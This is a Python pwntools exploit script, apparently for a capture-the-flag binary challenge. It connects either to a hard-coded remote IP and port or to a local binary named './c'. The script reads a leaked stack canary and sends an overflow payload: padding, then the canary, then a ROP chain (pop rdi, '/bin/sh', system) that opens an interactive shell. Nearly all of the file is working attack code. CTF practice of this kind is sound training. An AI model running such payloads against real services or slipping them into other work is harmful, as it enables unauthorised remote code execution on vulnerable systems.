#!/usr/bin/env python3
# Date: 2026-06-04 21:37:48

from kk import *

context.binary = './c'
context.log_level = 'debug'
# context.timeout = 5

elf = ELF('./c')
rop = ROP(elf)
#libc = ELF('')


def go():
    if args.KK or args.REMOTE:
        return remote('39.107.114.99',32785)
    else:
        return process(elf.path)

io = go()

stop = pause
S = pause
leak = lambda name, address: log.info("{} ===> {}".format(name, hex(address)))
s   = io.send
sl  = io.sendline
sla = io.sendlineafter
sa  = io.sendafter
slt = io.sendlinethen
st  = io.sendthen
r   = io.recv
rn  = io.recvn
rr  = io.recvregex
ru  = io.recvuntil
ra  = io.recvall
rl  = io.recvline
rs  = io.recvlines
rls = io.recvline_startswith
rle = io.recvline_endswith
rlc = io.recvline_contains
ia  = io.interactive
ic  = io.close
cr  = io.can_recv

def cmd(i, prompt="Your choice :"):
    sla(prompt, str(i))

def add():
    cmd(1)

def edit():
    cmd(2)

def show():
    cmd(3)

def dele():
    cmd(4)

def pwn():
    if args.GDB:
        GDB(io, 'vmmap\n')

    # ================= 你的利用代码写这里 =================
    system = 0x401197
    bin_sh = 0x40200a
    pop_rdi = 0x00000000004011ca
    
    ru(b'canary = 0x')
    '''
    canary = int(r(16),16)
    '''
    canary = int(io.recvline().strip(),16)
    leak('canary', canary)
    #print(canary)
    payload = b'a'*0x18 + p64(canary) + b'a'*8 +  p64(pop_rdi) + p64(bin_sh) + p64(system)
    s(payload)


    # ======================================================

    ia()

if __name__ == "__main__":
    pwn()